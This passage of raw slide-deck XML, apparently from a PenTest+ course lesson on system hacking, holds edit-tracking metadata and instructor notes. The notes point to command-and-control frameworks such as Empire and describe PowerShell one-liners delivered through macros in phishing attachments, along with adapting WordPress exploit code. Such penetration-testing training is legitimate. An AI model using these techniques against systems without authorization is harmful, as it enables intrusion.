        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:33:20.800" v="4331" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="685463285" sldId="286"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T14:26:54.359" v="20"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="685463285" sldId="286"/>
            <ac:spMk id="2" creationId="{A92B708E-4083-4962-9240-C5792BEC3394}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:32:32.811" v="4325" actId="6549"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="685463285" sldId="286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B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:35:29.945" v="4354" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2554177378" sldId="287"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T14:27:14.369" v="23"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2554177378" sldId="287"/>
            <ac:spMk id="2" creationId="{A92B708E-4083-4962-9240-C5792BEC3394}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:35:29.945" v="4354" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2554177378" sldId="287"/>
            <ac:spMk id="3" creationId="{D265882B-10E2-446D-A76D-9CAE7BFA8BE6}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:36:37.568" v="4362" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1567903217" sldId="288"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T14:27:24.018" v="25"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1567903217" sldId="288"/>
            <ac:spMk id="2" creationId="{A92B708E-4083-4962-9240-C5792BEC3394}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:36:37.568" v="4362" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1567903217" sldId="288"/>
            <ac:spMk id="3" creationId="{D265882B-10E2-446D-A76D-9CAE7BFA8BE6}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:45:36.281" v="4400" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3965838131" sldId="289"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:45:36.281" v="4400" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3965838131" sldId="289"/>
            <ac:spMk id="2" creationId="{00910985-B36C-4A8C-8F00-496036FF49CE}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T14:29:26.171" v="40"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3965838131" sldId="289"/>
            <ac:spMk id="3" creationId="{741BF6B6-2A64-4049-9A00-5F58CF8B2C57}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add del mod">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T15:04:11.119" v="134" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="571676868" sldId="296"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T14:26:43.214" v="18"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="571676868" sldId="296"/>
            <ac:spMk id="2" creationId="{A92B708E-4083-4962-9240-C5792BEC3394}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T15:03:58.937" v="133"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="571676868" sldId="296"/>
            <ac:spMk id="3" creationId="{D265882B-10E2-446D-A76D-9CAE7BFA8BE6}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T23:20:30.964" v="3673" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="903710657" sldId="297"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T23:20:25.299" v="3671" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="903710657" sldId="297"/>
            <ac:spMk id="2" creationId="{A92B708E-4083-4962-9240-C5792BEC3394}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T23:20:30.964" v="3673" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="903710657" sldId="297"/>
            <ac:spMk id="3" creationId="{D265882B-10E2-446D-A76D-9CAE7BFA8BE6}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add del">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T14:27:35.974" v="27"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="903710657" sldId="297"/>
            <ac:spMk id="5" creationId="{4E292EE1-EF0E-47D6-B9F8-BC7F39E44486}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T23:24:05.830" v="3712" actId="27636"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="395727396" sldId="298"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T14:27:48.326" v="35"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="395727396" sldId="298"/>
            <ac:spMk id="2" creationId="{A92B708E-4083-4962-9240-C5792BEC3394}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T23:24:05.830" v="3712" actId="27636"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="395727396" sldId="298"/>
            <ac:spMk id="3" creationId="{D265882B-10E2-446D-A76D-9CAE7BFA8BE6}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add del">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T14:27:48.217" v="33"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="395727396" sldId="298"/>
            <ac:spMk id="5" creationId="{8746EBD9-3243-4D0B-B6DB-9E3EC9D6540F}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod modNotesTx">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T18:28:42.141" v="1457" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2656235494" sldId="299"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T14:33:04.249" v="84" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2656235494" sldId="299"/>
            <ac:spMk id="2" creationId="{B48243AD-3E39-4BC8-9E9D-99B34DF44977}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T18:28:42.141" v="1457" actId="113"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2656235494" sldId="299"/>
            <ac:spMk id="3" creationId="{9318464E-1C83-428E-A2D0-EF551FB4FFCF}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new del mod">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T18:17:31.827" v="1336" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1502012434" sldId="300"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T18:11:40.760" v="1260" actId="6549"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1502012434" sldId="300"/>
            <ac:spMk id="3" creationId="{65787D30-5D36-44F1-A08E-24B5DB0C7710}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T23:35:03.290" v="3854" actId="27636"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2314281346" sldId="301"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T23:24:31.258" v="3733" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2314281346" sldId="301"/>
            <ac:spMk id="2" creationId="{B6676D36-6561-45FF-8E12-C25ADEE49C9B}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T23:35:03.290" v="3854" actId="27636"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2314281346" sldId="301"/>
            <ac:spMk id="3" creationId="{372DDDF5-5FE2-4F8B-9641-1ECDD9DB959B}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod modNotesTx">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:38:20.096" v="4365" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2289419650" sldId="302"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T23:36:09.536" v="3881" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2289419650" sldId="302"/>
            <ac:spMk id="2" creationId="{ED5217E1-C14A-490A-A120-1A0A3DD98769}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:38:20.096" v="4365" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2289419650" sldId="302"/>
            <ac:spMk id="3" creationId="{77291D4A-0109-46AA-9F4E-FAF6522F8D1B}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:38:40.739" v="4375" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1971516816" sldId="303"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T23:11:44.460" v="3517" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1971516816" sldId="303"/>
            <ac:spMk id="2" creationId="{3F5BA241-55AD-4E41-9331-A47412530C1C}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:38:40.739" v="4375" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1971516816" sldId="303"/>
            <ac:spMk id="3" creationId="{7C3F3E00-BEF8-43AD-8907-FEE64C96A94B}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:45:40.617" v="4401" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1779658782" sldId="304"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T02:45:40.617" v="4401" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1779658782" sldId="304"/>
            <ac:spMk id="2" creationId="{16B2FF23-B385-4FE2-8035-582D84842453}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-25T01:20:02.110" v="4278" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1779658782" sldId="304"/>
            <ac:spMk id="3" creationId="{8083C26B-9259-4500-A540-038A69C15E44}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add del mod modNotesTx">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T18:32:47.787" v="1532" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1461296342" sldId="305"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T18:23:45.419" v="1444" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1461296342" sldId="305"/>
            <ac:spMk id="3" creationId="{9318464E-1C83-428E-A2D0-EF551FB4FFCF}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod modNotesTx">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T21:29:10.654" v="3386" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2650087519" sldId="305"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T21:07:34.759" v="3018" actId="313"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2650087519" sldId="305"/>
            <ac:spMk id="2" creationId="{A92B708E-4083-4962-9240-C5792BEC3394}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T21:29:10.654" v="3386" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2650087519" sldId="305"/>
            <ac:spMk id="3" creationId="{D265882B-10E2-446D-A76D-9CAE7BFA8BE6}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T23:19:20.162" v="3663" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2701563907" sldId="306"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Lisa Bock" userId="1f2a7945151d6011" providerId="LiveId" clId="{B1E4D37D-9781-4596-B32C-5103C07AA7C5}" dt="2021-10-24T23:19:20.162" v="3663" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2701563907" sldId="306"/>
            <ac:spMk id="3" creationId="{D265882B-10E2-446D-A76D-9CAE7BFA8BE6}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Danielle Andries" userId="93d179e4-3c18-40f7-920e-ae80b202540d" providerId="ADAL" clId="{7B049343-B7AB-4F32-BDAE-F822FBED966C}"/>
    <pc:docChg chg="custSel addSld delSld modSld">
      <pc:chgData name="Danielle Andries" userId="93d179e4-3c18-40f7-920e-ae80b202540d" providerId="ADAL" clId="{7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:54:53.477" v="182" actId="2696"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Danielle Andries" userId="93d179e4-3c18-40f7-920e-ae80b202540d" providerId="ADAL" clId="{7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:53:48.124" v="110"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3676537154" sldId="256"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Danielle Andries" userId="93d179e4-3c18-40f7-920e-ae80b202540d" providerId="ADAL" clId="{7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:53:48.124" v="110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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:51:36.230" v="25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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:51:36.230" v="25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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:51:20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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:51:54.383" v="68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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:51:54.383" v="68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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:51:43.268" v="27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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:51:45.838" v="2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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:52:25.678" v="108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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:52:25.678" v="108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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:52:18.157" v="74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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:52:16.540" v="72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del">
        <pc:chgData name="Danielle Andries" userId="93d179e4-3c18-40f7-920e-ae80b202540d" providerId="ADAL" clId="{7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:54:53.477" v="182" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3073644457" sldId="284"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Danielle Andries" userId="93d179e4-3c18-40f7-920e-ae80b202540d" providerId="ADAL" clId="{7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:54:31.558" v="179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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:54:31.558" v="179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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:54:22.668" v="13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7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:54:16.828" v="120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685463285" sldId="286"/>
        </pc:sldMkLst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2554177378" sldId="287"/>
        </pc:sldMkLst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1567903217" sldId="288"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Danielle Andries" userId="93d179e4-3c18-40f7-920e-ae80b202540d" providerId="ADAL" clId="{7B049343-B7AB-4F32-BDAE-F822FBED966C}" dt="2021-10-13T13:54:40.371" v="181"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3965838131" sldId="289"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Danielle Andries" userId="93d179e4-3c18-40f7-920e-ae80b202540d" providerId="ADAL" clId="{4861A5BB-6EE5-45D1-A57D-24865CFBF497}"/>
    <pc:docChg chg="delSld">
      <pc:chgData name="Danielle Andries" userId="93d179e4-3c18-40f7-920e-ae80b202540d" providerId="ADAL" clId="{4861A5BB-6EE5-45D1-A57D-24865CFBF497}" dt="2022-10-19T21:50:25.431" v="1" actId="47"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="del">
        <pc:chgData name="Danielle Andries" userId="93d179e4-3c18-40f7-920e-ae80b202540d" providerId="ADAL" clId="{4861A5BB-6EE5-45D1-A57D-24865CFBF497}" dt="2022-10-19T21:50:25.431" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3073644457" sldId="284"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Danielle Andries" userId="93d179e4-3c18-40f7-920e-ae80b202540d" providerId="ADAL" clId="{4861A5BB-6EE5-45D1-A57D-24865CFBF497}" dt="2022-10-19T21:50:21.031" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2862291967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costam/awesome-command-contro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costam/awesome-command-control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github.com/BC-SECURITY/Empire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Explore </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" b="0" i="1" dirty="0" err="1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here</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR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:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="fr-FR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https://github.com/tcostam/awesome-command-control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR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8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73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Explore </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" b="0" i="1" dirty="0" err="1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here</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR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:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="fr-FR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https://github.com/tcostam/awesome-command-control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR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NOTE: Empire is now no longer maintained by the original developer. Maintenance is now handled by a group within Kali Linux. You can find the currently maintained version within Kali Linux called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="1" dirty="0" err="1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powershell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-empire here: </a:t>
            </a:r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4"/>
              </a:rPr>
              <a:t>https://github.com/BC-SECURITY/Empire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89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Discuss with students as to whether they have used any of these other options and what are their thoughts.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If no students respond, be prepared to add value with your experience.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21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NOTE: Also known as a “one-liner,” these collapsed or simplified scripts can be quickly injected in many ways, such as using macros in a word document that we sent as an attachment in a phishing email.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232629"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="ui-monospace"/>
              </a:rPr>
              <a:t>NOTE: IXE means Invoke-Expression</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i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47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NOTE: The same options could be added to the one-liner as well.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54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This section is of note because if WordPress were to change the location of this file, it would make it seem as though this exploit no longer works. However, a knowledgeable penetration tester that knows how to analyze and modify exploit code will be able to update the code and keep using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49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40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NOTE: Assembly language is lower level than typical source code, but it is still human readable and can include familiar programming elements like variables, functions, and even comments.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14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852816" y="131860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797095" y="131521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9FB4-7244-4484-B018-DD33DB9A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PT0-002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2C8-88F7-4382-A812-F719CC64D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A346-0A2D-4C5C-A981-A185650A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Performing System Hacking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723" y="1066518"/>
            <a:ext cx="7981244" cy="1080000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Lesson 14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59"/>
            <a:ext cx="8870950" cy="4337605"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Given a scenario, perform post-exploitation techniques.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Given a scenario, research attack vectors and perform network attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Explain use cases of the following tools during the phases of a penetration test.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Given a scenario, analyze script or code sample for use in a penetration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 Hacking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14A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with .NET and .NET Framework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PenTesting, the team will need to be familiar with a variety of software development tools when searching for vulnerabilities </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>One example is .NET, a software development framework </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Open-source, cross-platform - can run on Windows, Linux, and macOS, </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
